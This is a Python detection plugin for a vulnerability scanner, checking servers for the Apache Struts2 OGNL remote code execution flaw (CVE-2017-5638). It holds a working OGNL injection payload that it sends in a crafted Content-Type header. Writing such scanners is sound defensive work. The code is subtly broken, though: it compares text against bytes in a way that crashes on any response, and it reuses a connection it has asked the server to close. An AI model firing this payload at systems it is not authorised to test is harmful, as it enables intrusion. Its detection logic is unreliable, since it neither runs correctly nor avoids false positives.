"""
Plugin 1083: Apache Struts2 OGNL RCE (Equifax / CVE-2017-5638)
================================================================
Detects Apache Struts2 Jakarta Multipart parser RCE.
Real CVE: CVE-2017-5638 (CVSS 10.0)
"""
import asyncio
import ssl

from plugins import NaslPlugin, PluginResult


class Struts2RceDetection(NaslPlugin):
    PLUGIN_ID = 1083
    NAME = 'Apache Struts2 OGNL RCE Detection (CVE-2017-5638)'
    FAMILY = 'Web Applications'
    CVSS_SCORE = 10.0
    DESCRIPTION = (
        'The Jakarta Multipart parser in Apache Struts 2 2.3.x before 2.3.32 and '
        '2.5.x before 2.5.10.1 has improper exception handling for file upload '
        'multipart requests. A remote attacker can send a specially crafted '
        'Content-Type header to execute arbitrary OGNL expressions, leading to '
        'remote code execution. Used in the 2017 Equifax data breach affecting '
        '147 million people.'
    )
    SOLUTION = (
        'Upgrade Apache Struts to version 2.3.32 or 2.5.10.1 (or later). Apply '
        'WAF rules to block OGNL injection in Content-Type headers. Implement '
        'Struts security configuration with strict method access.'
    )
    CVE = ['CVE-2017-5638']
    PORTS = [8080, 8443, 80, 443]

    STRUTS_PATHS = [
        '/',
        '/login',
        '/index.action',
        '/showcase/',
        '/struts2/',
        '/do/',
    ]

    OGNL_PAYLOADS = [
        ('%{#context[\'com.opensymphony.xwork2.dispatcher.HttpServletResponse\']'
         '.addHeader(\'X-Check\',\'Struts2\')}.', 'Struts2'),
    ]

    CONTENT_TYPES = [
        'multipart/form-data',
        'application/x-www-form-urlencoded',
    ]

    async def check_target(self, target: str, port: int | None = None) -> list[PluginResult]:
        results = []

        for port_to_check in (self.PORTS if port is None else [port]):
            try:
                scheme = 'https' if port_to_check in (443, 8443) else 'http'
                ctx = None
                if scheme == 'https':
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE

                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(target, port_to_check, ssl=ctx),
                    timeout=5
                )

                host_header = target
                if target in ('127.0.0.1', 'localhost', '::1'):
                    host_header = 'alieninc.tech'

                for path in self.STRUTS_PATHS:
                    for ognl_payload, expected_hint in self.OGNL_PAYLOADS:
                        crafted_ct = (
                            f'multipart/form-data; boundary=----WebKitFormBoundary; '
                            f'{ognl_payload}'
                        )

                        body_data = (
                            b'------WebKitFormBoundary\r\n'
                            b'Content-Disposition: form-data; name="test"\r\n\r\n'
                            b'check\r\n'
                            b'------WebKitFormBoundary--\r\n'
                        )

                        req = (
                            f'POST {path} HTTP/1.1\r\n'
                            f'Host: {host_header}\r\n'
                            f'Content-Type: {crafted_ct}\r\n'
                            f'Content-Length: {len(body_data)}\r\n'
                            f'User-Agent: Centra/1.0\r\n'
                            f'Connection: close\r\n\r\n'
                        ).encode() + body_data

                        writer.write(req)
                        await writer.drain()

                        response = b''
                        try:
                            while True:
                                chunk = await asyncio.wait_for(reader.read(4096), timeout=3)
                                if not chunk:
                                    break
                                response += chunk
                                if len(response) > 8192:
                                    break
                        except asyncio.TimeoutError:
                            pass

                        if response:
                            status_line = response.split(b'\r\n')[0].decode('utf-8', errors='ignore')
                            headers_end = response.find(b'\r\n\r\n')
                            raw_headers = response[:headers_end].decode('utf-8', errors='ignore')

                            ognl_error_hints = [
                                'java.lang.Exception',
                                'java.lang.RuntimeException',
                                'ognl.OgnlException',
                                'com.opensymphony',
                                'org.apache.struts2',
                                'there is no Action mapped',
                                'Invalid request',
                                'Struts2',
                            ]
                            found_errors = [h for h in ognl_error_hints if h.lower() in response.lower()]

                            ognl_executed = f'X-Check: {expected_hint}' in raw_headers
                            error_500 = b'500' in response[:100]

                            if ognl_executed or found_errors:
                                results.append(PluginResult(
                                    vulnerable=True,
                                    target=target,
                                    port=port_to_check,
                                    cvss_score=self.CVSS_SCORE,
                                    severity='critical',
                                    description=(
                                        f'Apache Struts2 detected on port {port_to_check} — '
                                        f'potentially vulnerable to OGNL injection (CVE-2017-5638)'
                                    ),
                                    solution=self.SOLUTION,
                                    evidence=(
                                        f'Path: {path}, Status: {status_line}, '
                                        f'OGNL executed: {ognl_executed}, '
                                        f'Error hints: {found_errors}'
                                    ),
                                    references=[
                                        'https://nvd.nist.gov/vuln/detail/CVE-2017-5638',
                                        'https://www.tenable.com/plugins/nessus/100000',
                                    ]
                                ))
                                break
                    else:
                        continue
                    break

                writer.close()
                await writer.wait_closed()

            except (asyncio.TimeoutError, ConnectionRefusedError, OSError, ssl.SSLError):
                pass

        if not results:
            results.append(PluginResult(
                vulnerable=False, target=target, port=port or 0,
                description='No Apache Struts2 OGNL indicators detected on checked ports'
            ))

        return results
